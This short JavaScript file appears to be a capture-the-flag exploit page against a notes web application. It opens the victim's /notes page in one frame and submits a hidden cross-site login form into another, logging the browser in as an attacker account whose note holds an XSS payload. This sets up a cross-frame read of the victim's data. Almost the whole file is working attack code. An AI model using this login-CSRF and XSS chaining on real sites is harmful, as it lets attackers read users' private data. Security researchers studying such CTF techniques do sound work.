const instance = "http://instance.url";
// The XSS user needs to have a note with the XSS payload
const xssUser = { username: "b", password: "b" };

function awaitOnload(elt) {
return new Promise((res) => (elt.onload = () => res(elt)));
}

function loadFrame(url, name) {
const frame = document.createElement("iframe");
frame.name = name;
frame.src = url;
const r = awaitOnload(frame);
document.body.appendChild(frame);
return r;
}

function createForm(method, action) {
const form = document.createElement("form");
form.method = method;
form.action = action;
return form;
}

function createFormInput(form, name, value) {
const input = document.createElement("input");
input.type = "hidden";
input.name = name;
input.value = value;
form.appendChild(input);
}

function sleep(ms) {
return new Promise((res) => setTimeout(res, ms));
}

(async function () {
const flagFrame = await loadFrame(instance + "/notes", "flag");
const xssFrame = await loadFrame("about:blank", "xss");
const form = createForm("POST", instance + "/login");
createFormInput(form, "username", xssUser.username);
createFormInput(form, "password", xssUser.password);
form.target = xssFrame.name;
document.body.appendChild(form);
form.submit();
})();